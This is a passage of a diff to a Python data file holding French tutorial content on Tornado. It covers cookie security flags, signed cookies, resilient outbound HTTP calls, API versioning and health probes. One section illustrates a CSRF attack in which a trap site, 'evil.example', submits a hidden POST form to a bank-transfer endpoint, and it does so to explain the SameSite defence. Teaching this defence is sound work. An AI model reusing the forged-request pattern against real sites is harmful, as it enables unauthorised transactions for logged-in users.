+                    "`self.clear_cookie(\"isgp_session\")` émet un `Set-Cookie` portant une valeur vide et une date "
+                    "`Expires` reculée d'un an dans le passé, ordonnant au navigateur la purge immédiate de son coffre.\n\n"
+                    "```http — En-tête Set-Cookie blindé émis par Tornado (Format signé v2)\n"
+                    "HTTP/1.1 200 OK\n"
+                    "Set-Cookie: isgp_session=\"2|1:0|10:1763741500|12:isgp_session|24:eyJzdWIiOiJhbWluZSJ9|a8f9...hmac\"; Path=/; HttpOnly; Secure; SameSite=Strict\n"
+                    "```"
                 )
             },
             {
-                "heading": "2. Les 3 Drapeaux de Sécurité Obligatoires : `HttpOnly` (Anti-XSS), `Secure` (HTTPS), `SameSite` (Anti-CSRF)",
+                "heading": "2. Le blindage périmétrique navigateur : `HttpOnly` (Anti-XSS), `Secure` (TLS) et `SameSite` (Anti-CSRF)",
                 "body": (
-                    "Un cookie transportant une session ou un jeton d'API ne doit **jamais** être émis sans ses trois attributs de blindage :\n"
-                    "- **`HttpOnly` (`httponly=True` -> Protection contre le vol par XSS)** : Indique au navigateur que ce cookie est réservé exclusivement "
-                    "au protocole HTTP. Toute tentative de lecture par JavaScript via `document.cookie` renvoie une chaîne vide ! Un script XSS injecté "
-                    "ne peut donc pas exfiltrer la valeur du cookie.\n"
-                    "- **`Secure` (`secure=True` -> Protection contre l'écoute réseau *Man-in-the-Middle*)** : Interdit au navigateur d'envoyer le cookie "
-                    "sur une connexion HTTP non chiffrée ; il n'est transmis que sur **HTTPS (TLS)**.\n"
-                    "- **`SameSite` (`samesite=\"Strict\"` ou `\"Lax\"` -> Protection contre les attaques CSRF)** :\n"
-                    "  - Dans une attaque **CSRF (*Cross-Site Request Forgery*)**, un utilisateur connecté à votre banque visite un site piégé `evil.com` "
-                    "qui soumet en cachette un formulaire `<form action=\"https://votre-api.dz/virement\" method=\"POST\">`.\n"
-                    "  - Avec **`SameSite=Strict`**, le navigateur refuse catégoriquement d'attacher le cookie si la requête provient d'un site externe."
+                    "Émettre un cookie de session sans ses trois attributs de confinement revient à laisser le coffre "
+                    "ouvert aux scripts tiers ou aux attaques réseau. Chacun des trois drapeaux neutralise une classe "
+                    "d'attaque distincte du modèle de menace Web.\n\n"
+                    "#### `HttpOnly` contre l'exfiltration XSS et `Secure` contre l'écoute passive\n\n"
+                    "L'attribut `httponly=True` ordonne au navigateur de cloisonner hermétiquement le cookie hors du "
+                    "DOM : tout appel à `document.cookie` depuis la console ou depuis un script XSS malveillant omet "
+                    "totalement ce cookie. Parallèlement, `secure=True` interdit au navigateur de transmettre le cookie "
+                    "sur une liaison `http://` en clair, prévenant toute interception (*Man-in-the-Middle*) lors d'une "
+                    "redirection initiale sur un réseau Wi-Fi non fiable.\n\n"
+                    "#### `SameSite` contre la falsification de requête inter-sites (*CSRF*)\n\n"
+                    "Puisque le navigateur attache automatiquement les cookies, un site piégé `evil.example` visité par "
+                    "un administrateur connecté pouvait autrefois soumettre à son insu un `<form method=\"POST\" "
+                    "action=\"https://api.isgp.dz/virement\">`. L'attribut `samesite=\"Strict\"` coupe ce vecteur à la "
+                    "racine : le navigateur refuse catégoriquement d'adjoindre le cookie dès que la requête est initiée "
+                    "depuis un contexte inter-sites externe (tandis que `samesite=\"Lax\"` ne l'autorise que sur les "
+                    "navigations de premier niveau sûres en `GET`)."
                 )
             },
             {
-                "heading": "3. Cookie Standard en Clair (`self.set_cookie`) vs Cookie Signé Horodaté Tornado (`self.set_secure_cookie`)",
+                "heading": "3. Mécanique cryptographique interne de Tornado : format signé v2 (`_create_signature_v2`) et rotation de clés",
                 "body": (
-                    "Il est crucial de distinguer les deux méthodes natives de Tornado :\n"
-                    "- **Le Cookie standard (`self.set_cookie(\"isgp_theme\", \"sombre\")` / `self.get_cookie`)** : Sa valeur est brute et non signée. N'importe quel "
-                    "utilisateur peut ouvrir l'inspecteur de stockage (F12) et modifier la valeur. Ne l'utilisez **que** pour des préférences d'affichage "
-                    "(thème clair/sombre, langue).\n"
-                    "- **Le Cookie Signé Tornado (`self.set_secure_cookie` / `self.get_secure_cookie`)** : Dès que vous configurez `cookie_secret` sur "
-                    "`tornado.web.Application`, Tornado encode la valeur en Base64, y attache un horodatage Unix et signe le tout par **HMAC-SHA256** "
-                    "(format v2 : `2|1:0|10:timestamp|...|<signature_hmac>`). Si un client tente de modifier un seul caractère du cookie dans F12 pour "
-                    "s'attribuer le rôle `admin`, la vérification HMAC échoue et `self.get_secure_cookie()` renvoie proprement **`None`** !"
+                    "Tornado distingue rigoureusement deux primitives sur `RequestHandler` : `self.set_cookie(nom, val)` "
+                    "écrit une chaîne brute modifiable en trois secondes dans l'inspecteur F12 du navigateur (réservée "
+                    "aux préférences cosmétiques comme `theme=sombre`), tandis que `self.set_secure_cookie(nom, val)` "
+                    "mobilise le moteur cryptographique interne `tornado.web.create_signed_value`.\n\n"
+                    "#### Anatomie du format signé v2 et immunité contre l'échange de cookies\n\n"
+                    "Le format v2 de Tornado (`2|1:0|10:<timestamp>|12:<nom_cookie>|<len>:<b64_val>|<hmac_sha256>`) "
+                    "encode chaque champ avec un préfixe de longueur explicite et **inclut le nom même du cookie** ainsi "
+                    "que l'horodatage dans le calcul `HMAC-SHA256` dérivé de `cookie_secret`. Inclure le nom du cookie "
+                    "dans la signature déjoue une attaque subtile : un utilisateur ne peut pas copier la valeur signée "
+                    "d'un cookie secondaire `avatar=\"admin\"` pour la coller dans le cookie `role`. En cas d'altération "
+                    "d'un seul bit ou de dépassement de `max_age_days` (31 jours par défaut), `get_secure_cookie()` "
+                    "échoue en temps constant via `hmac.compare_digest` et retourne sobrement `None`.\n\n"
+                    "> [!TIP] Rotation de `cookie_secret` sans déconnexion de masse en production\n"
+                    "> Tornado accepte pour `cookie_secret` un dictionnaire versionné de clés "
+                    "`{1: \"ancienne_cle...\", 2: \"nouvelle_cle...\"}` accompagné du réglage `key_version=2` dans "
+                    "`Application(..., cookie_secret=CLES, key_version=2)`. Le préfixe `1:2|` du format v2 indique "
+                    "alors la version de clé utilisée : Tornado signe tous les nouveaux cookies avec la clé `2`, tout en "
+                    "continuant à valider sans coupure les sessions existantes signées avec la clé `1` le temps de la transition."
                 )
             }
         ],
@@ -726,8 +1208,8 @@ ENRICHMENT_D4_D5 = {
             }
         ],
         "practical_exercises": [
-            "Dans le Client HTTP ou avec `curl -i -X POST http://127.0.0.1:8888/api/sandbox/cookies/login`, inspectez les en-têtes `Set-Cookie` retournés par Tornado et vérifiez la présence de `HttpOnly` et `SameSite`.",
-            "Appelez ensuite `GET /api/sandbox/cookies/inspect` puis `POST /api/sandbox/cookies/logout` pour observer le cycle complet d'émission, de vérification HMAC et de révocation."
+            "Interrogez `POST http://127.0.0.1:8888/api/sandbox/cookies/login` avec `curl -i` afin d'analyser structurellement les six segments séparés par `|` du format signé v2 de Tornado ainsi que les directives `HttpOnly` et `SameSite`.",
+            "Configurez une `tornado.web.Application` munie d'un dictionnaire `cookie_secret={1: \"cle_v1...\", 2: \"cle_v2...\"}` et `key_version=2`, puis démontrez qu'un cookie précédemment signé sous la version `1` continue d'être accepté sans erreur par `get_secure_cookie()`."
         ]
     },
 
@@ -736,51 +1218,96 @@ ENRICHMENT_D4_D5 = {
     # =========================================================================
     "d5-l1": {
         "context": (
-            "Jusqu'ici, votre serveur Tornado répondait directement aux clients à partir de ses propres données. "
-            "Mais dans une architecture d'entreprise réelle (**Microservices** ou **Système d'Information distribué**), "
-            "votre API doit très souvent **devenir elle-même cliente d'autres APIs** pendant le traitement d'une requête : "
-            "interroger l'API de la Banque Centrale pour un taux de change, vérifier un numéro d'identification fiscal "
-            "auprès d'un service gouvernemental, ou déclencher l'envoi d'un e-mail transactionnel.\n"
-            "Or, dans un serveur asynchrone comme Tornado, appeler `urllib.request.urlopen()` ou `requests.get()` de manière synchrone "
-            "sans `timeout` **fige l'intégralité de l'Event-Loop (`IOLoop`)** pour tous les utilisateurs connectés ! "
-            "Ce chapitre enseigne l'utilisation du client natif non bloquant **`tornado.httpclient.AsyncHTTPClient`** avec "
-            "`request_timeout` et recul exponentiel (`Exponential Backoff`)."
+            "Dans un système d'information réel structuré en microservices ou interconnecté à des partenaires "
+            "institutionnels, votre serveur Tornado agit rarement en vase clos : au cours du traitement d'une requête "
+            "entrante, il devient lui-même **client HTTP en aval** pour consulter un cours de change bancaire, valider "
+            "un identifiant fiscal auprès d'un registre national ou ordonner l'expédition d'un courriel transactionnel.\n\n"
+            "C'est précisément sur ces appels sortants que surviennent les pannes en cascade (*Cascading Failures*) "
+            "les plus destructrices sur une architecture événementielle. Invoquer un client synchrone tel que "
+            "`requests.get()` ou `urllib.request.urlopen()` à l'intérieur d'un `RequestHandler` gèle le descripteur "
+            "de thread unique de l'`IOLoop` : pendant qu'un serveur partenaire ralenti met dix secondes à répondre, "
+            "plus aucune des mille autres connexions ouvertes sur votre nœud Tornado ne reçoit le moindre octet ! "
+            "Ce chapitre détaille l'ingénierie des appels sortants non bloquants via **`tornado.httpclient.AsyncHTTPClient`**, "
+            "encadrés par des budgets temporels stricts et un recul exponentiel avec gigue (*Jitter*)."
         ),
         "deep_sections": [
             {
-                "heading": "1. Anatomie d'une panne en cascade (*Cascading Failure*) et obligation vitale d'`AsyncHTTPClient` + `timeout`",
+                "heading": "1. Mécanique des pannes en cascade et multiplexage `epoll` d'`AsyncHTTPClient`",
                 "body": (
-                    "Comprenons mécaniquement pourquoi un appel HTTP sortant synchrone ou sans `timeout` est fatal sur une boucle d'événements :\n"
-                    "- Tornado traite toutes les connexions concurrentes sur sa boucle d'événements **`IOLoop`**.\n"
-                    "- Si une méthode `get(self)` utilise un appel bloquant (`requests.get(url)` sans `await`) ou sans `timeout` vers un partenaire "
-                    "qui met 30 secondes à répondre, la boucle d'événements est bloquée.\n"
-                    "- En déclarant **`async def get(self):`** et en utilisant **`await tornado.httpclient.AsyncHTTPClient().fetch(req)`** avec "
-                    "`connect_timeout=2.0` et `request_timeout=3.0`, Tornado suspend uniquement cette coroutine pendant l'attente réseau et "
-                    "continue de servir des milliers d'autres requêtes en parallèle !"
+                    "Lorsqu'un client synchrone classique émet une requête TCP sortante, le noyau Linux endort le "
+                    "processus appelant sur l'appel système `recv()` jusqu'à l'arrivée des paquets distants. Dans un "
+                    "processus Tornado mono-thread, endormir le thread principal revient à arrêter le cœur même de "
+                    "`IOLoop` : les acceptations de sockets `accept()`, les lectures d'en-têtes et même la sonde "
+                    "`/api/health/live` cessent instantanément de répondre, poussant l'orchestrateur à abattre le conteneur.\n\n"
+                    "#### Suspension coopérative de coroutine et double garde-fou temporel\n\n"
+                    "À l'inverse, `tornado.httpclient.AsyncHTTPClient` ouvre une socket cliente en mode **`O_NONBLOCK`**, "
+                    "l'enregistre auprès du même sélecteur noyau `epoll` que le serveur entrant, puis **suspend "
+                    "uniquement la coroutine courante** à l'instruction `await client.fetch(requete)`. Le fil d'exécution "
+                    "retourne aussitôt à l'`IOLoop` pour servir des milliers d'autres usagers jusqu'à ce que le noyau "
+                    "signale la disponibilité de la réponse aval ou l'échéance d'un chronomètre interne (`connect_timeout` "
+                    "pour la poignée de main TCP/TLS et `request_timeout` pour le transfert complet).\n\n"
+                    "> [!WARNING] Obligation absolue de borner `connect_timeout` et `request_timeout`\n"
+                    "> Même en mode asynchrone non bloquant, laisser un `fetch()` sans budget temporel strict accumule "
+                    "des coroutines et des tampons mémoire suspendus lorsqu'un partenaire subit une partition réseau "
+                    "silencieuse (*blackhole TCP*). Spécifiez systématiquement des délais courts adaptés au budget de "
+                    "latence interactif (par exemple `connect_timeout=1.5` et `request_timeout=3.0` secondes)."
                 )
             },
             {
-                "heading": "2. Stratégie de réessai intelligent (`Retry`) avec recul exponentiel non bloquant (`await asyncio.sleep`)",
+                "heading": "2. Résilience par recul exponentiel avec gigue (*Exponential Backoff & Jitter*) et traduction `502` / `504`",
                 "body": (
-                    "Que doit faire votre serveur Tornado lorsqu'un appel vers une API partenaire échoue ? Il faut distinguer deux cas :\n"
-                    "1. **Erreur cliente (`400`, `401`, `403`, `404`, `422`)** : **Ne jamais réessayer immédiatement**. La requête est mal "
-                    "formulée ou non autorisée ; la renvoyer 3 fois donnera 3 fois la même erreur.\n"
-                    "2. **Erreur transitoire réseau ou serveur (`Timeout`, `502`, `503`, `504`)** : Il s'agit souvent d'une micro-coupure "
-                    "réseau de 100 millisecondes. On applique alors une boucle de **Retry avec Exponential Backoff** en utilisant "
-                    "**`await asyncio.sleep(delai)`** (et jamais `time.sleep()` qui bloquerait l'`IOLoop` !).\n"
-                    "3. **Traduction sémantique pour le client final (`502` vs `504`)** : Si les 3 tentatives échouent, votre API renvoie :\n"
-                    "   - **`504 Gateway Timeout`** si le serveur partenaire a dépassé le délai imparti.\n"
-                    "   - **`502 Bad Gateway`** si le serveur partenaire a renvoyé une réponse invalide ou une erreur `5xx`."
+                    "Tous les échecs d'une dépendance externe ne appellent pas la même réaction algorithmique. Une "
+                    "erreur `4xx` (`400`, `401`, `404`, `422`) exprime un rejet déterministe du contrat : réessayer "
+                    "immédiatement est pur gaspillage. En revanche, une expiration de délai (`599` interne Tornado / "
+                    "`TimeoutError`) ou une erreur `502`, `503`, `504` trahit fréquemment une micro-congestion réseau "
+                    "transitoire qu'un nouvel essai espacé résout avec succès.\n\n"
+                    "#### Prévenir l'effet de troupeau (*Thundering Herd*) par `await asyncio.sleep` et gigue aléatoire\n\n"
+                    "Si cinq cents coroutines échouent au même instant `T` face à un partenaire surchargé et réessaient "
+                    "toutes exactement à `T + 1.000s`, elles lui infligent une seconde vague synchronisée qui l'achève. "
+                    "On combine donc une progression géométrique (`base * 2 ** essai`) à une **gigue aléatoire "
+                    "(*Full Jitter*)** via `random.uniform`, en suspendant la coroutine exclusivement avec **`await "
+                    "asyncio.sleep(delai)`** — et jamais `time.sleep()`, qui gèlerait l'`IOLoop`.\n\n"
+                    "```python — Appel sortant résilient non bloquant avec AsyncHTTPClient dans Tornado\n"
+                    "import asyncio, random\n"
+                    "from tornado.httpclient import AsyncHTTPClient, HTTPRequest\n\n"
+                    "async def interroger_partenaire_resilient(url: str) -> tuple[int, bytes]:\n"
+                    "    client = AsyncHTTPClient()\n"
+                    "    for essai in range(3):\n"
+                    "        req = HTTPRequest(url=url, method=\"GET\", connect_timeout=1.5, request_timeout=2.5)\n"
+                    "        rep = await client.fetch(req, raise_error=False)\n"
+                    "        if 200 <= rep.code < 300:\n"
+                    "            return 200, rep.body\n"
+                    "        if 400 <= rep.code < 500:\n"
+                    "            return 502, b'{\"erreur\": \"Rejet deterministe du partenaire amont\"}'\n"
+                    "        if essai < 2:\n"
+                    "            plafond = 0.2 * (2 ** essai)\n"
+                    "            await asyncio.sleep(random.uniform(plafond / 2, plafond))\n"
+                    "    statut_passerelle = 504 if rep.code == 599 else 502\n"
+                    "    return statut_passerelle, b'{\"erreur\": \"Partenaire externe indisponible\"}'\n"
+                    "```\n\n"
+                    "Passer `raise_error=False` à `client.fetch()` est une idiomatique Tornado précieuse : au lieu de "
+                    "lever une exception coûteuse sur chaque code non-`2xx`, Tornado retourne proprement un objet "
+                    "`HTTPResponse` dont `rep.code == 599` identifie sans ambiguïté un dépassement de délai (traduit "
+                    "vers le client final en **`504 Gateway Timeout`**), tandis qu'un `5xx` distant ou un corps JSON "
+                    "illisible se traduit sémantiquement en **`502 Bad Gateway`**."
                 )
             },
             {
-                "heading": "3. `tornado.httpclient.AsyncHTTPClient` vs `urllib.request` / `httpx`",
+                "heading": "3. Moteur `SimpleAsyncHTTPClient` vs `CurlAsyncHTTPClient`, pool `max_clients` et idempotence",
                 "body": (
-                    "En Python/Tornado, deux contextes d'utilisation coexistent :\n"
-                    "- **À l'intérieur d'un `RequestHandler` Tornado (`async def get(self):`)** : Utilisez toujours **`tornado.httpclient.AsyncHTTPClient()`** "
-                    "(ou `httpx.AsyncClient()`), qui s'intègre nativement à l'`IOLoop` sans bloquer le thread principal.\n"
-                    "- **Dans un script CLI autonome hors serveur** : `urllib.request.urlopen(..., timeout=5.0)` ou `requests` permet d'interroger "
-                    "l'API simplement avec un timeout explicite."
+                    "Sous le capot, `AsyncHTTPClient()` est une fabrique configurée à l'échelle de l'`IOLoop` qui "
+                    "s'appuie par défaut sur `SimpleAsyncHTTPClient` (implémentation pure Python légère et sans "
+                    "dépendance C externe) et bride par sécurité la concurrence sortante simultanée à `max_clients=10` "
+                    "(les requêtes excédentaires patientant proprement dans une file interne bornée).\n\n"
+                    "#### Dimensionnement de haute charge et règle d'idempotence sur les réessais\n\n"
+                    "Pour une passerelle Tornado d'agrégation appelée à maintenir plusieurs centaines de requêtes "
+                    "sortantes en parallèle vers des moteurs internes rapides, relevez ce plafond dès l'amorçage du "
+                    "processus via `AsyncHTTPClient.configure(None, max_clients=100)` (ou activez "
+                    "`tornado.curl_httpclient.CurlAsyncHTTPClient` adossé à `libcurl` C pour le multiplexage HTTP/2 "
+                    "et les proxys d'entreprise). Enfin, n'appliquez **jamais** de boucle de `Retry` automatique sur "
+                    "une mutation `POST` non idempotente (comme un débit bancaire) dépourvue d'en-tête `Idempotency-Key` : "
+                    "un `Timeout` à la lecture de la réponse ne prouve nullement que le partenaire n'a pas déjà exécuté "
+                    "la transaction !"
                 )
             }
         ],
@@ -822,8 +1349,8 @@ ENRICHMENT_D4_D5 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez `day_5/01_client_python_auth.py` pour observer comment `AsyncHTTPClient` absorbe deux pannes `503` transitoires grâce au recul exponentiel avant de réussir à la 3e tentative.",
-            "Implémentez un disjoncteur simple (**Circuit Breaker**) : si 5 appels consécutifs vers le partenaire échouent, ouvrez le circuit pendant 30 secondes pour échouer instantanément."
+            "Exécutez le module `day_5/01_client_python_auth.py` pour observer en temps réel comment `AsyncHTTPClient(..., raise_error=False)` absorbe deux erreurs transitoires `503` grâce à `await asyncio.sleep()` sans jamais figer la boucle d'événements.",
+            "Enrichissez votre client sortant d'un automate **Circuit Breaker** à trois états (`CLOSED`, `OPEN`, `HALF_OPEN`) : au bout de cinq échecs consécutifs vers le partenaire, basculez en état `OPEN` pendant 30 secondes afin de retourner immédiatement `503` en microsecondes sans saturer le réseau aval."
         ]
     },
 
@@ -832,61 +1359,85 @@ ENRICHMENT_D4_D5 = {
     # =========================================================================
     "d5-l2": {
         "context": (
-            "Deux questions fondamentales se posent dès qu'une API dépasse le stade du prototype :\n"
-            "1. **Comment organiser 150 `RequestHandlers` en Python sans transformer `app.py` en un fichier illisible de 6 000 lignes** ?\n"
-            "2. **Pourquoi voit-on presque toujours `/api/v1/...` dans les APIs mondiales (OpenAI `/v1/`, Stripe `/v1/`, Kubernetes `/v1`) "
-            "et si rarement `/api/v2/...` ?** Et si `v2` est si rare, pourquoi est-il pourtant obligatoire de préfixer ses routes par `/api/v1` "
-            "dès le premier jour ?\n"
-            "Ce chapitre répond en profondeur à ces deux questions d'architecture industrielle à travers les **Sous-tables de Routage Modulaires Tornado**, "
-            "l'**Application Factory (`create_app`)**, la distinction entre **Évolution Rétrocompatible (*Non-Breaking*)** et **Rupture de Contrat (*Breaking Change*)**, "
-            "ainsi que le protocole officiel de dépréciation **IETF RFC 8594 (`Deprecation` & `Sunset`)**."
+            "Lorsqu'une plateforme Tornado passe de dix routes expérimentales à cent cinquante `RequestHandlers` "
+            "maintenus par plusieurs équipes d'ingénierie, deux défis d'architecture logicielle deviennent "
+            "déterminants. Le premier concerne la **modularité interne** : comment structurer le routage, l'injection "
+            "de configuration et les sondes d'orchestration sans transformer `app.py` en un monolithe indéchiffrable ?\n\n"
+            "Le second touche à la **gouvernance temporelle des contrats publics** : pourquoi la quasi-totalité des "
+            "grandes plateformes mondiales (Stripe, OpenAI, Kubernetes) exposent-elles `/v1/` pendant près d'une "
+            "décennie sans créer `/v2/` chaque trimestre, tout en rendant obligatoire ce préfixe `/api/v1` dès la "
+            "première mise en ligne ? Ce chapitre formalise l'assemblage modulaire par **Application Factory "
+            "(`create_app`)**, le principe de robustesse de Postel (*Tolerant Reader*) et le cycle protocolaire "
+            "normalisé de dépréciation **IETF RFC 8594 (`Deprecation` et `Sunset`)**."
         ),
         "deep_sections": [
             {
-                "heading": "1. Pourquoi voit-on presque toujours `/api/v1` et rarement `/api/v2` ? (Loi de Postel & *Tolerant Reader*)",
+                "heading": "1. Gouvernance des contrats : Loi de Postel, évolutions additives (`/api/v1`) vs ruptures (`/api/v2`)",
                 "body": (
-                    "Dans l'industrie, une API bien conçue reste sur **`/api/v1` pendant 5 à 10 ans** parce que **90 % des évolutions fonctionnelles "
-                    "sont additives et rétrocompatibles (*Non-Breaking Changes*)** :\n"
-                    "- **Ce qui NE casse PAS les clients existants (On reste en `/api/v1`)** :\n"
-                    "  1. **Ajouter un nouveau champ** dans la réponse JSON (ex: ajouter `\"certifiant\": true` à un objet formation) : selon le patron "
-                    "*Tolerant Reader* (Loi de Postel), une application mobile ou React qui lit `data.intitule` ignore simplement les nouvelles clés JSON qu'elle ne connaît pas.\n"
-                    "  2. **Ajouter une nouvelle route** (ex: `GET /api/v1/certificats`).\n"
-                    "  3. **Ajouter un paramètre de requête optionnel** avec valeur par défaut (ex: `GET /api/v1/formations?lang=fr`).\n"
-                    "- **Ce qui CASSE les clients existants (*Breaking Changes* -> Obligation de créer `/api/v2`)** :\n"
-                    "  1. **Supprimer ou renommer une clé JSON existante** (ex: renommer `\"intitule\"` en `\"titre\"`).\n"
-                    "  2. **Changer le type de données d'un champ** (ex: en `v1`, `\"duree\": 5` est un entier ; en `v2`, `\"duree\": {\"valeur\": 5, \"unite\": \"jours\"}` "
-                    "devient un dictionnaire — tout client `v1` qui faisait `formation.duree * 7` plante immédiatement avec `TypeError` !).\n"
-                    "  3. **Exiger un nouveau champ obligatoire** dans le corps d'un `POST` ou `PUT` sans valeur par défaut côté serveur.\n"
-                    "- **Pourquoi mettre `/api/v1` dès le Jour 1 (« L'Assurance-Vie Architecturale ») ?** Avec `/api/v1/` présent dès l'origine, vous "
-                    "déployez `/api/v2/` à côté de `/api/v1/` sans aucune interruption de service pour les applications mobiles déjà distribuées !"
+                    "Une interface REST publique constitue un engagement contractuel envers des clients dont vous ne "
+                    "maîtrisez pas le calendrier de mise à jour (applications mobiles installées sur des centaines de "
+                    "milliers de téléphones ou connecteurs ERP d'entreprises partenaires). Si l'on observe que `/api/v1` "
+                    "perdure cinq à dix ans en production, c'est parce qu'une conception disciplinée permet de réaliser "
+                    "plus de **90 % des évolutions métier de manière purement additive et rétrocompatible**.\n\n"
+                    "> « Be conservative in what you do, be liberal in what you accept from others. » "
+                    "— Jon Postel, IETF RFC 761 (Principe de robustesse / Patron *Tolerant Reader* de Martin Fowler)\n\n"
+                    "#### Frontière formelle entre changement additif et *Breaking Change*\n\n"
+                    "Conformément au patron *Tolerant Reader*, ajouter une nouvelle clé JSON dans une réponse existante "
+                    "(par exemple `\"certifiant\": true`), exposer un nouvel endpoint (`GET /api/v1/certificats`) ou "
+                    "accepter un paramètre de requête facultatif muni d'une valeur par défaut ne brise aucun client `v1` "
+                    "existant : un désérialiseur bien écrit ignore les clés inconnues. À l'inverse, supprimer ou "
+                    "renommer un attribut (`intitule` remplacé par `titre`), muter le type structurel d'un champ "
+                    "(transformer l'entier `\"duree\": 5` en objet `{\"valeur\": 5, \"unite\": \"jours\"}`) ou rendre "
+                    "obligatoire un nouveau champ en entrée constitue une **rupture de contrat (*Breaking Change*)**. "
+                    "Présence vitale dès le Jour 1, le préfixe `/api/v1` agit alors comme une police d'assurance : il "
+                    "permet de monter `/api/v2` en parallèle sur le même serveur Tornado sans casser une seule "
+                    "application mobile en circulation."
                 )
             },
             {
-                "heading": "2. Comment faire coexister `/api/v1` et `/api/v2` dans Tornado et déprécier `v1` (Norme RFC 8594)",
+                "heading": "2. Coexistence multi-versions dans Tornado et protocole officiel d'extinction IETF RFC 8594 (`Sunset`)",
                 "body": (
-                    "Lorsqu'une version `/api/v2` est créée, on ne coupe **jamais** `/api/v1` brutalement : on ouvre une **période de coexistence et de transition** "
-                    "(généralement 6 à 12 mois) :\n"
-                    "1. **Deux sous-tables de routage sur la même couche métier** : Dans Tornado, `FormationsV1Handler` (`/api/v1/formations`) et `FormationsV2Handler` "
-                    "(`/api/v2/formations`) interrogent exactement la même couche métier mais formatent le dictionnaire JSON différemment.\n"
-                    "2. **Signalement automatique de fin de vie via `set_default_headers(self)` sur `FormationsV1Handler` (RFC 8594)** : Chaque réponse de `/api/v1` inclut "
-                    "trois en-têtes HTTP standards :\n"
-                    "   - `Deprecation: true` : Signale officiellement que cette version de l'API est en fin de vie.\n"
-                    "   - `Sunset: Thu, 31 Dec 2026 23:59:59 GMT` : Indique la date et l'heure exactes d'extinction définitive.\n"
-                    "   - `Link: </api/v2/formations>; rel=\"successor-version\"` : Indique l'URL de la nouvelle version.\n"
-                    "3. **Extinction finale (`410 Gone`)** : Une fois la date `Sunset` dépassée, `/api/v1` renvoie le code HTTP **`410 Gone`**."
+                    "Lorsqu'une rupture de schéma justifie l'ouverture de `/api/v2`, l'ingénierie de production proscrit "
+                    "toute coupure brutale de `/api/v1`. Les deux versions cohabitent durant une fenêtre de migration "
+                    "annoncée (six à douze mois) en partageant strictement la **même couche de services métier et la "
+                    "même base SQL** : seuls les adaptateurs de sérialisation des deux `RequestHandlers` diffèrent.\n\n"
+                    "#### Signalisation machine-lisible de fin de vie dans `set_default_headers(self)`\n\n"
+                    "Plutôt que d'espérer que tous les développeurs partenaires lisent une lettre d'information, les "
+                    "spécifications **IETF RFC 8594 (`Sunset`)** et **`Deprecation`** injectent l'avis d'extinction "
+                    "directement dans les en-têtes HTTP de chaque réponse `v1`, permettant aux passerelles et journaux "
+                    "clients de remonter des alertes proactives automatisées.\n\n"
+                    "```http — En-têtes normalisés RFC 8594 émis par FormationsV1Handler\n"
+                    "HTTP/1.1 200 OK\n"
+                    "Content-Type: application/json; charset=UTF-8\n"
+                    "Deprecation: true\n"
+                    "Sunset: Thu, 31 Dec 2026 23:59:59 GMT\n"
+                    "Link: </api/v2/formations>; rel=\"successor-version\"\n"
+                    "```\n\n"
+                    "Une fois l'échéance `Sunset` échue et le trafic résiduel tombé à zéro dans les métriques d'accès, "
+                    "les routes `/api/v1/*` ne sont pas remplacées par un `404 Not Found` ambigu, mais par un gestionnaire "
+                    "dédié renvoyant **`410 Gone`** (RFC 9110, Section 15.5.11), qui atteste formellement que la "
+                    "ressource a existé autrefois mais a été définitivement retirée au profit de `/api/v2`."
                 )
             },
             {
-                "heading": "3. Découpage modulaire (`get_*_routes()`), *Application Factory* (`create_app`) & Sondes (`Liveness`/`Readiness`)",
+                "heading": "3. Sous-tables de routage modulaires, *Application Factory* (`create_app`) et sondes Kubernetes",
                 "body": (
-                    "Au-delà du versioning, l'industrialisation d'une application Tornado repose sur trois piliers :\n"
-                    "- **Les sous-tables de routage par domaine** : Chaque module (`get_web_routes()`, `get_v1_routes()`, `get_v2_routes()`, `get_health_routes()`) "
-                    "retourne sa liste de tuples `(regex, HandlerClass)` assemblée dans `create_app()`.\n"
-                    "- **L'Application Factory (`def create_app(config=None) -> tornado.web.Application:`)** : Instancie l'`Application` Tornado à la demande "
-                    "pour la production comme pour les tests `AsyncHTTPTestCase`.\n"
-                    "- **Les Sondes de Santé (*Healthchecks*)** :\n"
-                    "  - `GET /api/health/live` (*Liveness Probe*) : Vérifie uniquement que l'`IOLoop` Tornado répond (`200 OK`).\n"
-                    "  - `GET /api/health/ready` (*Readiness Probe*) : Vérifie que la base de données SQL répond (`200 OK` ou `503 Service Unavailable`)."
+                    "Contrairement aux micro-frameworks reposant sur un singleton global décoré à l'importation, "
+                    "Tornado représente nativement sa table de routage comme une **structure de données pure** : une "
+                    "séquence ordonnée de tuples `(motif_regex, ClasseHandler, dict_init)` ou d'objets `tornado.web.URLSpec`. "
+                    "Chaque domaine fonctionnel (`routes_v1.py`, `routes_v2.py`, `routes_health.py`) expose ainsi une "
+                    "fonction pure retournant sa sous-liste de routes, assemblée proprement par concaténation dans une "
+                    "fabrique **`create_app(settings_override=None) -> tornado.web.Application`**.\n\n"
+                    "#### Distinction vitale entre sonde *Liveness* (`/live`) et sonde *Readiness* (`/ready`)\n\n"
+                    "En environnement conteneurisé (Kubernetes, Docker Swarm, Cloud Run) ou derrière Nginx Plus, toute "
+                    "application Tornado industrielle expose deux sondes de santé aux sémantiques strictement distinctes.\n\n"
+                    "> [!IMPORTANT] Ne jamais interroger la base de données dans la sonde Liveness (`/api/health/live`)\n"
+                    "> La sonde **Liveness (`/api/health/live`)** répond à l'unique question : « Le processus Python et "
+                    "son `IOLoop` sont-ils vivants (non bloqués en interblocage) ? » en renvoyant immédiatement `200 OK` "
+                    "en mémoire. La sonde **Readiness (`/api/health/ready`)**, quant à elle, exécute un `SELECT 1` rapide "
+                    "et renvoie `503 Service Unavailable` si PostgreSQL est en maintenance afin que le répartiteur suspende "
+                    "temporairement l'envoi de trafic. Si vous mettiez le test SQL dans `/live`, une brève panne de base "
+                    "de données pousserait Kubernetes à redémarrer en boucle tous vos conteneurs Tornado pourtant sains !"
                 )
             }
         ],
@@ -934,8 +1485,8 @@ ENRICHMENT_D4_D5 = {
             }
         ],
         "practical_exercises": [
-            "Dans le Sandbox HTTP ou avec `curl -i http://127.0.0.1:8888/api/v1/sandbox/formations`, inspectez les en-têtes HTTP de dépréciation (`Deprecation`, `Sunset`, `Link`), puis appelez `/api/v2/sandbox/formations` pour comparer la transformation du champ `duree`.",
-            "Exécutez `day_5/03_architecture_blueprints.py` pour observer la coexistence de `v1`, `v2`, du portail HTML et des sondes Healthcheck."
